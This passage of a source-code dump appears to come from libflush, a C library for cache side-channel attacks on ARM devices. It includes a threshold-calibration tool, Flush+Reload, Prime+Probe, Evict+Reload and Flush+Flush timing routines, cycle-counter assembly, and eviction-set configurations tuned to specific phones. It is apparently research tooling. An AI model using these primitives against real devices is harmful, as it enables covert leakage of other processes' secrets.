  if (miss_histogram == NULL) {
    fprintf(stderr, "Error: Could not allocate memory for histogram.\n");
    return -1;
  }

  /* Map memory region */
#define MAP_SIZE 4096
  void* array = mmap(NULL, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (array == MAP_FAILED) {
    fprintf(stderr, "Error: Could not map memory.\n");

    free(hit_histogram);
    free(miss_histogram);

    return -1;
  }

  /* Chose target address */
  void* address = (void*) ((char*) array + MAP_SIZE / 2);
  libflush_access_memory(address);

  /* Measure hit function */
  hit_function(libflush_session, address, histogram_entries,
      hit_histogram, histogram_size, histogram_scale);

  /* Measure miss function */
  libflush_flush(libflush_session, address);

  miss_function(libflush_session, address, histogram_entries,
      miss_histogram, histogram_size, histogram_scale);

  // Get the maximum value of a cache hit and the minimum value of a cache miss
  size_t hit_maximum_index = 0;
  size_t hit_maximum = 0;

  size_t miss_minimum_index = 0;
  size_t miss_maximum = 0;
  size_t miss_maximum_index = 0;

  for (size_t i = 0; i < histogram_size; i++) {
      if (hit_maximum < hit_histogram[i]) {
          hit_maximum = hit_histogram[i];
          hit_maximum_index = i;
      }

      if (miss_maximum < miss_histogram[i]) {
          miss_maximum = miss_histogram[i];
          miss_maximum_index = i;
      }

      if (miss_histogram[i] > histogram_threshold && miss_minimum_index == 0) {
          miss_minimum_index = i;
      }
  }

  int cache = hit_maximum_index * histogram_scale;
  int mem = miss_maximum_index * histogram_scale;
  int threshhold = mem - (mem - cache) / 2;

  for (unsigned int i = 0; i < histogram_size; i++) {
    fprintf(stdout, "%4zu: %10zu %10zu\n", i * histogram_scale, hit_histogram[i], miss_histogram[i]);
    if (logfile != NULL) {
      fprintf(logfile, "%zu,%zu,%zu\n", i * histogram_scale, hit_histogram[i], miss_histogram[i]);
    }
  }

  fprintf(stderr, "Cache access time: %d\n", cache);
  fprintf(stderr, "Memory access time: %d\n", mem);
  fprintf(stderr, "Threshhold: %d\n", threshhold);

  /* Clean-up */
  free(hit_histogram);
  free(miss_histogram);

  if (logfile != NULL) {
    fclose(logfile);
  }

  if (array != NULL) {
    munmap(array, MAP_SIZE);
  }

  /* Terminate libflush */
  if (libflush_terminate(libflush_session) == false) {
    fprintf(stderr, "Error: Could not terminate libflush\n");
    return -1;
  }

  return 0;
}

static void
flush_reload_hit(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    size_t time = libflush_reload_address(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
flush_reload_miss(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    size_t time = libflush_reload_address_and_flush(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
prime_probe_hit(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  size_t set_index = libflush_get_set_index(libflush_session, address);

  for (unsigned int i = 0; i < runs; i++) {
    libflush_prime(libflush_session, set_index);
    size_t time = libflush_probe(libflush_session, set_index);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
prime_probe_miss(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  size_t set_index = libflush_get_set_index(libflush_session, address);

  for (unsigned int i = 0; i < runs; i++) {
    libflush_prime(libflush_session, set_index);
    libflush_access_memory(address);
    size_t time = libflush_probe(libflush_session, set_index);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
evict_reload_hit(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    size_t time = libflush_reload_address(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
evict_reload_miss(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  libflush_evict(libflush_session, address);

  for (unsigned int i = 0; i < runs; i++) {
    size_t time = libflush_reload_address_and_evict(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
flush_flush_hit(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    libflush_reload_address(libflush_session, address);
    size_t time = libflush_flush_time(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
flush_flush_miss(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    size_t time = libflush_flush_time(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
prefetch_hit(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    size_t time = libflush_prefetch_time(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}

static void
prefetch_miss(libflush_session_t* libflush_session, void* address, size_t runs, size_t* histogram, size_t
    histogram_size, size_t histogram_scale)
{
  for (unsigned int i = 0; i < runs; i++) {
    libflush_flush(libflush_session, address);
    size_t time = libflush_prefetch_time(libflush_session, address);
    histogram[MIN(histogram_size - 1, time / histogram_scale)]++;
    sched_yield();
  }
}


```

`libflush/libflush.pc.in`:

```in
Name: ${project}
Description: c
Version: ${version}
URL:
Cflags: -I${includedir}
Libs: -L${libdir} -lflush

```

`libflush/libflush/armv7/configuration.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V7_CONFIGURATION_H
#define ARM_V7_CONFIGURATION_H

#define CYCLE_COUNTER_DIV_64 0

#endif // ARM_V7_CONFIGURATION_H

```

`libflush/libflush/armv7/internal.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V7_INTERNAL_H
#define ARM_V7_INTERNAL_H

#include "../libflush.h"

void arm_v7_timing_init(bool div64);
void arm_v7_timing_terminate(void);

#endif // ARM_V7_INTERNAL_H

```

`libflush/libflush/armv7/libflush.c`:

```c
/* See LICENSE file for license and copyright information */

#include "libflush.h"
#include "internal.h"
#include "configuration.h"
#include "../timing.h"

void
arm_v7_init(libflush_session_t* session, libflush_session_args_t* args)
{
  (void) session;
  (void) args;

#if TIME_SOURCE == TIME_SOURCE_REGISTER
  bool div64 = CYCLE_COUNTER_DIV_64;
  if (args != NULL && args->performance_register_div64 == true) {
    div64 = true;
  }

  // Enable user space performance counter
  arm_v7_timing_init(div64);
#endif
}

void
arm_v7_terminate(libflush_session_t* session)
{
  (void) session;

  // Disable user space performance counter
#if TIME_SOURCE == TIME_SOURCE_REGISTER
  arm_v7_timing_terminate();
#endif
}

```

`libflush/libflush/armv7/libflush.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V7_LIBFLUSH_H
#define ARM_V7_LIBFLUSH_H

#include "../libflush.h"

#include "timing.h"
#include "memory.h"

void arm_v7_init(libflush_session_t* session, libflush_session_args_t* args);
void arm_v7_terminate(libflush_session_t* session);

#endif /* ARM_V7_LIBFLUSH_H */

```

`libflush/libflush/armv7/memory.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V7_MEMORY_H
#define ARM_V7_MEMORY_H

inline void
arm_v7_access_memory(void* pointer)
{
  volatile uint32_t value;
  asm volatile ("LDR %0, [%1]\n\t"
      : "=r" (value)
      : "r" (pointer)
      );
}

inline void
arm_v7_memory_barrier(void)
{
  asm volatile ("DSB");
  asm volatile ("ISB");
}

inline void
arm_v7_prefetch(void* pointer)
{
  asm volatile ("pld [%0]" :: "r" (pointer));
}

#endif  /*ARM_V7_MEMORY_H*/

```

`libflush/libflush/armv7/timing.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V7_TIMING_H
#define ARM_V7_TIMING_H

#include <stdint.h>
#include "memory.h"
#include "timing.h"
#include "configuration.h"

#define ARMV7_PMCR_E       (1 << 0) /* Enable all counters */
#define ARMV7_PMCR_P       (1 << 1) /* Reset all counters */
#define ARMV7_PMCR_C       (1 << 2) /* Cycle counter reset */
#define ARMV7_PMCR_D       (1 << 3) /* Cycle counts every 64th cpu cycle */
#define ARMV7_PMCR_X       (1 << 4) /* Export to ETM */

#define ARMV7_PMCNTENSET_C (1 << 31) /* Enable cycle counter */

#define ARMV7_PMOVSR_C     (1 << 31) /* Overflow bit */

inline uint64_t
arm_v7_get_timing(void)
{
  uint32_t result = 0;

  asm volatile ("MRC p15, 0, %0, c9, c13, 0" : "=r" (result));

  return result;
}

inline void
arm_v7_reset_timing(bool div64)
{
  uint32_t value = 0;

  value |= ARMV7_PMCR_E; // Enable all counters
  value |= ARMV7_PMCR_P; // Reset all counters
  value |= ARMV7_PMCR_C; // Reset cycle counter to zero
  value |= ARMV7_PMCR_X; // Enable export of events

  if (div64 == true) {
    value |= ARMV7_PMCR_D; // Enable cycle count divider
  }

  // Performance Monitor Control Register
  asm volatile ("MCR p15, 0, %0, c9, c12, 0" :: "r" (value));
}

inline void
arm_v7_timing_init(bool div64)
{
  uint32_t value = 0;

  value |= ARMV7_PMCR_E; // Enable all counters
  value |= ARMV7_PMCR_P; // Reset all counters
  value |= ARMV7_PMCR_C; // Reset cycle counter to zero
  value |= ARMV7_PMCR_X; // Enable export of events

  if (div64 == true) {
    value |= ARMV7_PMCR_D; // Enable cycle count divider
  }

  // Performance Monitor Control Register
  asm volatile ("MCR p15, 0, %0, c9, c12, 0" :: "r" (value));

  // Count Enable Set Register
  value = 0;
  value |= ARMV7_PMCNTENSET_C;

  for (unsigned int x = 0; x < 4; x++) {
    value |= (1 << x); // Enable the PMx event counter
  }

  asm volatile ("MCR p15, 0, %0, c9, c12, 1" :: "r" (value));

  // Overflow Flag Status register
  value = 0;
  value |= ARMV7_PMOVSR_C;

  for (unsigned int x = 0; x < 4; x++) {
    value |= (1 << x); // Enable the PMx event counter
  }
  asm volatile ("MCR p15, 0, %0, c9, c12, 3" :: "r" (value));
}

inline void
arm_v7_timing_terminate(void)
{
  uint32_t value = 0;
  uint32_t mask = 0;

  // Performance Monitor Control Register
  asm volatile ("MRC p15, 0, %0, c9, c12, 0" :: "r" (value));

  mask = 0;
  mask |= ARMV7_PMCR_E; /* Enable */
  mask |= ARMV7_PMCR_C; /* Cycle counter reset */
  mask |= ARMV7_PMCR_P; /* Reset all counters */
  mask |= ARMV7_PMCR_X; /* Export */

  asm volatile ("MCR p15, 0, %0, c9, c12, 0" :: "r" (value & ~mask));
}

#endif  /*ARM_V7_TIMING_H*/

```

`libflush/libflush/armv8/flush.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V8_FLUSH_H
#define ARM_V8_FLUSH_H

inline void arm_v8_flush(void* address)
{
  asm volatile ("DC CIVAC, %0" :: "r"(address));
  asm volatile ("DSB ISH");
  asm volatile ("ISB");
}

#endif /* ARM_V8_FLUSH_H */

```

`libflush/libflush/armv8/internal.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V8_INTERNAL_H
#define ARM_V8_INTERNAL_H

void arm_v8_timing_init(void);
void arm_v8_timing_terminate(void);

#endif // ARM_V8_INTERNAL_H

```

`libflush/libflush/armv8/libflush.c`:

```c
/* See LICENSE file for license and copyright information */

#include "libflush.h"
#include "internal.h"
#include "../timing.h"

void
arm_v8_init(libflush_session_t* session, libflush_session_args_t* args)
{
  (void) session;
  (void) args;

  // Enable user space performance counter
#if TIME_SOURCE == TIME_SOURCE_REGISTER
  arm_v8_timing_init();
#endif
}

void
arm_v8_terminate(libflush_session_t* session)
{
  (void) session;

  // Disable user space performance counter
#if TIME_SOURCE == TIME_SOURCE_REGISTER
  arm_v8_timing_terminate();
#endif
}

```

`libflush/libflush/armv8/libflush.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V8_LIBFLUSH_H
#define ARM_V8_LIBFLUSH_H

#include "../libflush.h"

#include "flush.h"
#include "timing.h"
#include "memory.h"

void arm_v8_init(libflush_session_t* session, libflush_session_args_t* args);
void arm_v8_terminate(libflush_session_t* session);

#endif /* ARM_V8_LIBFLUSH_H */

```

`libflush/libflush/armv8/memory.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_v8_MEMORY_H
#define ARM_v8_MEMORY_H

inline void
arm_v8_access_memory(void* pointer)
{
  volatile uint32_t value;
  asm volatile ("LDR %0, [%1]\n\t"
      : "=r" (value)
      : "r" (pointer)
      );
}

inline void
arm_v8_memory_barrier(void)
{
  asm volatile ("DSB SY");
  asm volatile ("ISB");
}

inline void
arm_v8_prefetch(void* pointer)
{
  asm volatile ("PRFM PLDL3KEEP, [%x0]" :: "p" (pointer));
  asm volatile ("PRFM PLDL2KEEP, [%x0]" :: "p" (pointer));
  asm volatile ("PRFM PLDL1KEEP, [%x0]" :: "p" (pointer));
}

#endif  /*ARM_v8_MEMORY_H*/

```

`libflush/libflush/armv8/timing.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef ARM_V8_TIMING_H
#define ARM_V8_TIMING_H

#include <stdint.h>
#include "memory.h"

#define ARMV8_PMCR_E            (1 << 0) /* Enable all counters */
#define ARMV8_PMCR_P            (1 << 1) /* Reset all counters */
#define ARMV8_PMCR_C            (1 << 2) /* Cycle counter reset */

#define ARMV8_PMUSERENR_EN      (1 << 0) /* EL0 access enable */
#define ARMV8_PMUSERENR_CR      (1 << 2) /* Cycle counter read enable */
#define ARMV8_PMUSERENR_ER      (1 << 3) /* Event counter read enable */

#define ARMV8_PMCNTENSET_EL0_EN (1 << 31) /* Performance Monitors Count Enable Set register */

inline uint64_t
arm_v8_get_timing(void)
{
  uint64_t result = 0;

  asm volatile("MRS %0, PMCCNTR_EL0" : "=r" (result));

  return result;
}

inline void
arm_v8_timing_init(void)
{
  uint32_t value = 0;

  /* Enable Performance Counter */
  asm volatile("MRS %0, PMCR_EL0" : "=r" (value));
  value |= ARMV8_PMCR_E; /* Enable */
  value |= ARMV8_PMCR_C; /* Cycle counter reset */
  value |= ARMV8_PMCR_P; /* Reset all counters */
  asm volatile("MSR PMCR_EL0, %0" : : "r" (value));

  /* Enable cycle counter register */
  asm volatile("MRS %0, PMCNTENSET_EL0" : "=r" (value));
  value |= ARMV8_PMCNTENSET_EL0_EN;
  asm volatile("MSR PMCNTENSET_EL0, %0" : : "r" (value));
}

inline void
arm_v8_timing_terminate(void)
{
  uint32_t value = 0;
  uint32_t mask = 0;

  /* Disable Performance Counter */
  asm volatile("MRS %0, PMCR_EL0" : "=r" (value));
  mask = 0;
  mask |= ARMV8_PMCR_E; /* Enable */
  mask |= ARMV8_PMCR_C; /* Cycle counter reset */
  mask |= ARMV8_PMCR_P; /* Reset all counters */
  asm volatile("MSR PMCR_EL0, %0" : : "r" (value & ~mask));

  /* Disable cycle counter register */
  asm volatile("MRS %0, PMCNTENSET_EL0" : "=r" (value));
  mask = 0;
  mask |= ARMV8_PMCNTENSET_EL0_EN;
  asm volatile("MSR PMCNTENSET_EL0, %0" : : "r" (value & ~mask));
}

inline void
arm_v8_reset_timing(void)
{
  uint32_t value = 0;
  asm volatile("MRS %0, PMCR_EL0" : "=r" (value));
  value |= ARMV8_PMCR_C; /* Cycle counter reset */
  asm volatile("MSR PMCR_EL0, %0" : : "r" (value));
}

#endif  /*ARM_V8_TIMING_H*/

```

`libflush/libflush/eviction/configuration.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef LIBFLUSH_EVICTION_CONFIGURATION_H
#define LIBFLUSH_EVICTION_CONFIGURATION_H

#define ADDRESS_CACHE_SIZE 128

#define USE_FIXED_MEMORY_SIZE 1
#define PHYSICAL_MEMORY_MAPPED_SIZE (10 * 1024 * 1024)
#define FRACTION_OF_PHYSICAL_MEMORY 0.1

#endif // LIBFLUSH_EVICTION_CONFIGURATION_H

```

`libflush/libflush/eviction/eviction.c`:

```c
/* See LICENSE file for license and copyright information */

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/sysinfo.h>

#ifdef PTHREAD_ENABLE
#include <pthread.h>
#endif

#include "../libflush.h"
#include "../internal.h"
#include "eviction.h"

#define __include_strategy(x) #x
#define _include_strategy(x) __include_strategy(x)
#define include_strategy(x) _include_strategy(x)

#include include_strategy(DEVICE_CONFIGURATION)

#include "configuration.h"

#define ADDRESS_COUNT ((ES_EVICTION_COUNTER) + (ES_DIFFERENT_ADDRESSES_IN_LOOP) - 1)

typedef struct virtual_address_cache_entry_s {
#ifdef PTHREAD_ENABLE
  pthread_mutex_t lock;
#endif
  bool used;
  void* virtual_address;
  size_t index;
} virtual_address_cache_entry_t;

typedef struct congruent_address_cache_entry_s {
#ifdef PTHREAD_ENABLE
  pthread_mutex_t lock;
#endif
  bool used;
  void* congruent_virtual_addresses[ADDRESS_COUNT];
} congruent_address_cache_entry_t;

typedef struct memory_s {
#ifdef PTHREAD_ENABLE
  pthread_mutex_t lock;
#endif
  size_t mapping_size;
  void* mapping;
  int pagemap;
} memory_t;

typedef struct libflush_eviction_s {
  congruent_address_cache_entry_t congruent_address_cache[NUMBER_OF_SETS];
  virtual_address_cache_entry_t virtual_address_cache[ADDRESS_CACHE_SIZE];
#ifdef PTHREAD_ENABLE
    pthread_mutex_t virtual_address_cache_lock;
#endif
  memory_t memory;
} libflush_eviction_t;

#if USE_FIXED_MEMORY_SIZE == 0
static size_t get_physical_memory_size(void);
#endif

void evict(congruent_address_cache_entry_t* address_cache_entry);
void find_congruent_addresses(libflush_session_t* session, libflush_eviction_t*
    eviction, size_t index, uintptr_t physical_address);

void
libflush_eviction_evict(libflush_session_t* session, void* address)
{
  libflush_eviction_t* eviction = (libflush_eviction_t*) session->data;

#ifdef PTHREAD_ENABLE
  pthread_mutex_lock(&(eviction->virtual_address_cache_lock));
#endif
  // Check if address is cached and run eviction
  for (unsigned int i = 0; i < ADDRESS_CACHE_SIZE; i++) {
    if (eviction->virtual_address_cache[i].virtual_address == address) {
      evict(&(eviction->congruent_address_cache[eviction->virtual_address_cache[i].index]));
#ifdef PTHREAD_ENABLE
  pthread_mutex_unlock(&(eviction->virtual_address_cache_lock));
#endif
      return;
    }
  }

  // Find free cache entry
  virtual_address_cache_entry_t* virtual_address_cache_entry = NULL;
  for (unsigned int i = 0; i < ADDRESS_CACHE_SIZE; i++) {
    if (eviction->virtual_address_cache[i].used == false) {
      virtual_address_cache_entry = &(eviction->virtual_address_cache[i]);
      break;
    }
  }

  // If there is no free cache entry, we chose a random one
  if (virtual_address_cache_entry == NULL) {
#if defined(__ARM_ARCH_7A__)
    virtual_address_cache_entry = &(eviction->virtual_address_cache[lrand48() % ADDRESS_CACHE_SIZE]);
#else
    virtual_address_cache_entry = &(eviction->virtual_address_cache[rand() % ADDRESS_CACHE_SIZE]);
#endif
  }

  uintptr_t physical_address = libflush_get_physical_address(session, (size_t) address);
  uint64_t index = (physical_address >> LINE_LENGTH_LOG2) % NUMBER_OF_SETS;

  // Set cache entry information
  virtual_address_cache_entry->virtual_address  = address;
  virtual_address_cache_entry->used = true;
  virtual_address_cache_entry->index = index;

#ifdef PTHREAD_ENABLE
    pthread_mutex_lock(&(eviction->congruent_address_cache[index].lock));
#endif

  if (eviction->congruent_address_cache[index].used == false) {
    find_congruent_addresses(session, eviction, index, physical_address);
  }

#ifdef PTHREAD_ENABLE
    pthread_mutex_unlock(&(eviction->congruent_address_cache[index].lock));
#endif

#ifdef PTHREAD_ENABLE
  pthread_mutex_unlock(&(eviction->virtual_address_cache_lock));
#endif

  // Run eviction
  evict(&(eviction->congruent_address_cache[virtual_address_cache_entry->index]));
}

bool
libflush_eviction_init(libflush_session_t* session, libflush_session_args_t* args)
{
  if (session == NULL) {
    return false;
  }

  (void) args;

  libflush_eviction_t* eviction = calloc(1, sizeof(libflush_eviction_t));
  if (eviction == NULL) {
    return false;
  }

  session->data = eviction;

#ifdef PTHREAD_ENABLE
  assert(pthread_mutex_init(&(eviction->memory.lock), NULL) == 0);
  assert(pthread_mutex_init(&(eviction->virtual_address_cache_lock), NULL) == 0);
  pthread_mutex_lock(&(eviction->memory.lock));
#endif

  // Calculate mapping size
#if USE_FIXED_MEMORY_SIZE == 1
  eviction->memory.mapping_size = PHYSICAL_MEMORY_MAPPED_SIZE;
#else
  eviction->memory.mapping_size = get_physical_memory_size() * FRACTION_OF_PHYSICAL_MEMORY;
#endif

  // Map memory
  eviction->memory.mapping = mmap(NULL, eviction->memory.mapping_size, PROT_READ | PROT_WRITE,
                       MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  assert(eviction->memory.mapping != (void *) -1);

  // Initialize the mapping so that the pages are non-empty.
  for (uint64_t index = 0; index < eviction->memory.mapping_size; index += 0x400) {
      uint64_t* temporary = (uint64_t*) (((uint8_t*) eviction->memory.mapping) + index);
      temporary[0] = index;
  }

  // Clean address cache
  memset(eviction->virtual_address_cache, 0, ADDRESS_CACHE_SIZE * sizeof(virtual_address_cache_entry_t));
  memset(eviction->congruent_address_cache, 0, NUMBER_OF_SETS * sizeof(congruent_address_cache_entry_t));

#ifdef PTHREAD_ENABLE
  for (unsigned int i = 0; i < ADDRESS_CACHE_SIZE; i++) {
    assert(pthread_mutex_init(&(eviction->virtual_address_cache[i].lock), NULL) == 0);
  }

  for (unsigned int i = 0; i < ADDRESS_CACHE_SIZE; i++) {
    assert(pthread_mutex_init(&(eviction->congruent_address_cache[i].lock), NULL) == 0);
  }

  pthread_mutex_unlock(&(eviction->memory.lock));
#endif

  return true;
}

bool
libflush_eviction_terminate(libflush_session_t* session)
{
  if (session == NULL) {
    return false;
  }

  libflush_eviction_t* eviction = (libflush_eviction_t*) session->data;

  if (eviction == NULL) {
    return true;
  }

#ifdef PTHREAD_ENABLE
  pthread_mutex_lock(&(eviction->memory.lock));
#endif

  if (eviction->memory.mapping != NULL) {
    munmap(eviction->memory.mapping, eviction->memory.mapping_size);
  }

  eviction->memory.mapping_size = 0;
  eviction->memory.mapping = NULL;

#ifdef PTHREAD_ENABLE
  for (unsigned int i = 0; i < ADDRESS_CACHE_SIZE; i++) {
    pthread_mutex_destroy(&(eviction->virtual_address_cache[i].lock));
  }

  for (unsigned int i = 0; i < ADDRESS_CACHE_SIZE; i++) {
    pthread_mutex_destroy(&(eviction->congruent_address_cache[i].lock));
  }

  pthread_mutex_unlock(&(eviction->memory.lock));
  pthread_mutex_destroy(&(eviction->memory.lock));
#endif

  /* Free eviction data */
  free(eviction);
  session->data = NULL;

  return true;
}

void
libflush_eviction_prime(libflush_session_t* session, size_t set_index)
{
  libflush_eviction_t* eviction = (libflush_eviction_t*) session->data;

#ifdef PTHREAD_ENABLE
  pthread_mutex_lock(&(eviction->virtual_address_cache_lock));
  pthread_mutex_lock(&(eviction->congruent_address_cache[set_index].lock));
#endif

  if (eviction->congruent_address_cache[set_index].used == false) {
    find_congruent_addresses(session, eviction, set_index, (uintptr_t) NULL);
  }

#ifdef PTHREAD_ENABLE
  pthread_mutex_unlock(&(eviction->congruent_address_cache[set_index].lock));
  pthread_mutex_unlock(&(eviction->virtual_address_cache_lock));
#endif

  evict(&(eviction->congruent_address_cache[set_index]));
}

void libflush_eviction_probe(libflush_session_t* session, size_t set_index)
{
  libflush_eviction_t* eviction = (libflush_eviction_t*) session->data;

#ifdef PTHREAD_ENABLE
  pthread_mutex_lock(&(eviction->congruent_address_cache[set_index].lock));
#endif

  congruent_address_cache_entry_t congruent_address_cache_entry =
    eviction->congruent_address_cache[set_index];

  if (congruent_address_cache_entry.used == false) {
    find_congruent_addresses(session, eviction, set_index, (uintptr_t) NULL);
  }

  for (int i = ADDRESS_COUNT - 1; i >= 0; i -= 1) {
    libflush_access_memory(congruent_address_cache_entry.congruent_virtual_addresses[i]);
  }

#ifdef PTHREAD_ENABLE
  pthread_mutex_unlock(&(eviction->congruent_address_cache[set_index].lock));
#endif
}

size_t
libflush_eviction_get_number_of_sets(libflush_session_t* session)
{
  (void) session;

  return NUMBER_OF_SETS;
}

size_t
libflush_eviction_get_set_index(libflush_session_t* session, void* address)
{
  uintptr_t physical_address = libflush_get_physical_address(session, (uintptr_t) address);
  return (physical_address >> LINE_LENGTH_LOG2) % NUMBER_OF_SETS;
}

#if USE_FIXED_MEMORY_SIZE == 0
static size_t
get_physical_memory_size(void)
{
  struct sysinfo info;
  sysinfo(&info);

  return info.totalram * info.mem_unit;
}
#endif

inline void
evict(congruent_address_cache_entry_t* congruent_address_cache_entry)
{
#ifdef PTHREAD_ENABLE
  pthread_mutex_lock(&(congruent_address_cache_entry->lock));
  if (congruent_address_cache_entry->used == false) {
    pthread_mutex_unlock(&(congruent_address_cache_entry->lock));
    return;
  }
#endif
  for (unsigned int i = 0; i < ES_EVICTION_COUNTER; i += 1) {
    for (unsigned int j = 0; j < ES_NUMBER_OF_ACCESSES_IN_LOOP; j++) {
      for (unsigned int k = 0; k < ES_DIFFERENT_ADDRESSES_IN_LOOP; k++) {
        libflush_access_memory(congruent_address_cache_entry->congruent_virtual_addresses[i+k]);
      }
    }
  }
#ifdef PTHREAD_ENABLE
  pthread_mutex_unlock(&(congruent_address_cache_entry->lock));
#endif
}

inline void
find_congruent_addresses(libflush_session_t* session, libflush_eviction_t*
    eviction, size_t index, uintptr_t physical_address)
{
  // Find congruent addresses
  unsigned int found = 0;
  for (unsigned int i = 0; i < eviction->memory.mapping_size; i += LINE_LENGTH) {
#ifdef PTHREAD_ENABLE
    pthread_mutex_lock(&(eviction->memory.lock));
#endif
    uint8_t* virtual_address_2 = (uint8_t*) eviction->memory.mapping + i;
#ifdef PTHREAD_ENABLE
    pthread_mutex_unlock(&(eviction->memory.lock));
#endif
    uintptr_t physical_address_2 = libflush_get_physical_address(session, (uintptr_t) virtual_address_2);
    uint64_t index_2 = (physical_address_2 >> LINE_LENGTH_LOG2) % NUMBER_OF_SETS;

    if (index == index_2 && physical_address != physical_address_2) {
      eviction->congruent_address_cache[index].congruent_virtual_addresses[found++] =
        virtual_address_2;
    }

    if (found == ADDRESS_COUNT) {
      break;
    }
  }

  // Abort if we were not able to find enough addresses
  assert(found == ADDRESS_COUNT);

  eviction->congruent_address_cache[index].used = true;
}

```

`libflush/libflush/eviction/eviction.h`:

```h
/* See LICENSE file for license and copyright information */

#ifndef LIBFLUSH_EVICTION_H
#define LIBFLUSH_EVICTION_H

#include "../libflush.h"

bool libflush_eviction_init(libflush_session_t* session, libflush_session_args_t* args);
bool libflush_eviction_terminate(libflush_session_t* session);
void libflush_eviction_evict(libflush_session_t* session, void* address);

void libflush_eviction_prime(libflush_session_t* session, size_t set_index);
void libflush_eviction_probe(libflush_session_t* session, size_t set_index);

size_t libflush_eviction_get_set_index(libflush_session_t* session, void* address);
size_t libflush_eviction_get_number_of_sets(libflush_session_t* session);

#endif // LIBFLUSH_EVICTION_H

```

`libflush/libflush/eviction/strategies/alto45.h`:

```h
/* See LICENSE file for license and copyright information */

/* Alcatel OneTouch Pop 2 */
#define NUMBER_OF_SETS 512
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 16
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 1
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 6

```

`libflush/libflush/eviction/strategies/bacon.h`:

```h
/* See LICENSE file for license and copyright information */

/* OnePlus One */
#define NUMBER_OF_SETS 4096
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 10
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 2
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 2

```

`libflush/libflush/eviction/strategies/default.h`:

```h
/* See LICENSE file for license and copyright information */

/* Default example configuration */
#define NUMBER_OF_SETS 4096
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 28
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 5
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 4

```

`libflush/libflush/eviction/strategies/hammerhead.h`:

```h
/* See LICENSE file for license and copyright information */

/* Nexus 5 */
#define NUMBER_OF_SETS 4096
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 10
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 2
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 2

```

`libflush/libflush/eviction/strategies/mako.h`:

```h
/* See LICENSE file for license and copyright information */

/* Nexus 4 */
#define NUMBER_OF_SETS 2048
#define LINE_LENGTH_LOG2 7
#define LINE_LENGTH 128
#define ES_EVICTION_COUNTER 12
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 1
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 2

```

`libflush/libflush/eviction/strategies/manta.h`:

```h
/* See LICENSE file for license and copyright information */

/* Nexus 10 */
#define NUMBER_OF_SETS 1024
#define LINE_LENGTH_LOG2 6
#define LINE_LENGTH 64
#define ES_EVICTION_COUNTER 10
#define ES_NUMBER_OF_ACCESSES_IN_LOOP 2
#define ES_DIFFERENT_ADDRESSES_IN_LOOP 2

```

`libflush/libflush/eviction/strategies/tilapia.h`:

